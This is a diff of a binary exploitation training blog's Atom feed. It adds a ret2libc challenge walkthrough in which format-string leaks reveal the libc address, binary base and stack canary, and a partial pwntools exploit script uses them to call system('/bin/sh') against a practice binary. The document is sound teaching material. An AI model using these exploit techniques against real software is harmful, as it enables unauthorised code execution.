@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://tourpran.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://tourpran.me/" rel="alternate" type="text/html" /><updated>2021-06-05T21:53:13+05:30</updated><id>http://tourpran.me/feed.xml</id><title type="html">TourPran Blogs</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">Return to libc</title><link href="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html" rel="alternate" type="text/html" title="Return to libc" /><published>2021-05-24T00:00:00+05:30</published><updated>2021-05-24T00:00:00+05:30</updated><id>http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain</id><content type="html" xml:base="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html">&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://tourpran.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://tourpran.me/" rel="alternate" type="text/html" /><updated>2021-06-06T11:04:04+05:30</updated><id>http://tourpran.me/feed.xml</id><title type="html">TourPran Blogs</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">Return to libc</title><link href="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html" rel="alternate" type="text/html" title="Return to libc" /><published>2021-05-24T00:00:00+05:30</published><updated>2021-05-24T00:00:00+05:30</updated><id>http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain</id><content type="html" xml:base="http://tourpran.me/pwn-training/2021/05/24/return2libcpwntrain.html">&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction:&lt;/h3&gt;
 
@@ -25,22 +25,22 @@
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;checksec
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;RELRO:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;RELRO&lt;/strong&gt;:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Partial RELRO - the got is writeable, nothing much to bother here.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;CANARY:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CANARY&lt;/strong&gt;:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;No canary, we can do a overflow peacefully :)&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;No eXecute:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;No eXecute&lt;/strong&gt;:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;NX Enabled - this makes sure that the code on the stack is not excecuted.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;PIE:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;PIE&lt;/strong&gt;:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;PIE Disabled, we know the address of all the code in the binary.&lt;/li&gt;
 &lt;/ul&gt;
@@ -51,7 +51,11 @@
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Its simple and easy, just overflow the buffer with garbage value and fill the return with… with… wait… with what ? Since there is no win function as such what exactly will we do ? Can we somehow get a shell by leaking something ? Lets look at the idea behind this challenge.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Since gets is a vulnerable function, we can use it to write more data than what the buffer can hold.&lt;/li&gt;
+  &lt;li&gt;Also there are no win functions this time. We have to rely on the shared object.&lt;/li&gt;
+  &lt;li&gt;Lets explore this challenge now.&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;h4 id=&quot;global-offset-table&quot;&gt;Global Offset Table:&lt;/h4&gt;
 
@@ -59,11 +63,12 @@
 
 &lt;h4 id=&quot;exploit-idea&quot;&gt;Exploit Idea:&lt;/h4&gt;
 
-&lt;p&gt;Our aim right now, is to leak an address in the libc (shared library). The reason is because we are not given any helper funciton in our program to get a shell, so we use the function in the libc called system with arguments “/bin/sh” to get a shell.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time.&lt;/li&gt;
+  &lt;li&gt;There is a function called system in the libc which will pop a shell if we give the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; as the parameter.&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;→ We can use the puts function since its already called by our program, so the GOT of this function will be resolved ( real address pointing to libc will be filled ).&lt;/p&gt;
-
-&lt;p&gt;→ puts function takes one input which is the string to be printed. What if we can call puts with puts ?  :thinking:&lt;/p&gt;
+&lt;p&gt;→ We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).&lt;/p&gt;
 
 &lt;h4 id=&quot;pseudo-code&quot;&gt;Pseudo code:&lt;/h4&gt;
 
@@ -138,7 +143,144 @@ b* 0x00000000004011c7
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h3 id=&quot;challenge-2&quot;&gt;Challenge 2&lt;/h3&gt;</content><author><name>tourpran</name></author><category term="pwn-training" /><category term="libc leak" /><category term="ret2libc" /><summary type="html"></summary></entry><entry><title type="html">Format String Exploitation</title><link href="http://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html" rel="alternate" type="text/html" title="Format String Exploitation" /><published>2021-05-20T00:00:00+05:30</published><updated>2021-05-20T00:00:00+05:30</updated><id>http://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2</id><content type="html" xml:base="http://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html">&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining2/pwntrain13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;challenge-2&quot;&gt;Challenge 2:&lt;/h3&gt;
+
+&lt;p&gt;In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/images/pwntraining3/ret2libc_canary&quot;&gt;vuln binary&lt;/a&gt; and 
+&lt;a href=&quot;/assets/images/pwntraining3/ret2libc_canary.c&quot;&gt;vuln c code&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution:&lt;/h3&gt;
+&lt;p&gt;Lets do the drill of checking the mitigations.&lt;/p&gt;
+
+&lt;h4 id=&quot;mitigations-1&quot;&gt;Mitigations:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Canary:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;A set of characters that will be checked before returning. If the value has changed the program aborts.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;No eXecute:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;NX Enabled - this makes sure that the code on the stack is not excecuted.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;PIE:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;PIE Enabled, We dont know the address of the code for the binary.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;code-walkthrough-1&quot;&gt;Code Walkthrough:&lt;/h4&gt;
+
+&lt;p&gt;There is only a main function.
+&lt;img src=&quot;/assets/images/pwntraining3/pwntrain6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. &lt;a href=&quot;https://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html&quot;&gt;Not sure about format string ? Go Here&lt;/a&gt;. In the next section we can use the gets function to input more data than the buffer can store.&lt;/p&gt;
+
+&lt;h4 id=&quot;canary&quot;&gt;Canary:&lt;/h4&gt;
+&lt;p&gt;Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain7.jpg&quot; alt=&quot;drawing&quot; width=&quot;500&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Bypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;exploit-1&quot;&gt;Exploit:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Lets try to leak some variables from the stack by giving some %p.&lt;/li&gt;
+  &lt;li&gt;We can store all of them in a list and analyse what is what.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# phase 1 : leaking binary and libc address
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;So you wanna try again. Go ahead :)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%p &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Info leaked: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can confirm that the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7faea03&lt;/code&gt; is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked. :thinking:&lt;/p&gt;
+
+&lt;p&gt;Address that is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x5555555550a0&lt;/code&gt;, is a address that is winthin the binary, we can calculate the offset like the previous one.&lt;/p&gt;
+
+&lt;p&gt;Finally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwntraining3/pwntrain10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now to find the position of canary we can set a break point in the address before the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_chk_fail@plt&lt;/code&gt;. The stack will be stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCX&lt;/code&gt; register. Create a offset pattern then see what value is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCX&lt;/code&gt; register and place the canary value there to complete the exploit.&lt;/p&gt;
+
+&lt;p&gt;Now it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; to populate it with the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;. Below I have given the commented solution.&lt;/p&gt;
+
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Set up pwntools for the correct architecture
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'amd64'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'./ret2libc_canary'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ret2libc_canary&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# ./exploit.py DEBUG NOASLR
+&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Start the exploit against the target.'''&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;c1&quot;&gt;# ./exploit.py GDB
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''
+b* main+164
+'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;locals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# phase 1 : leaking binary and libc address
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;So you wanna try again. Go ahead :)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%p &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# send format specifier to leak data from the stack
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# recv the new line.
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store all leaked data as a list.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Info leaked: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# log it to make sure everything works fine
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2013699&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# take the first element in the list which is a libc function.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Libc Base: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# log it
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4256&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# calculate the binary offset from the leak.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;binary_base: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# log it
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_leaked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store the canary from the leak
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# pahse 2 : usign the leak to ret2libc
+&lt;/span&gt;
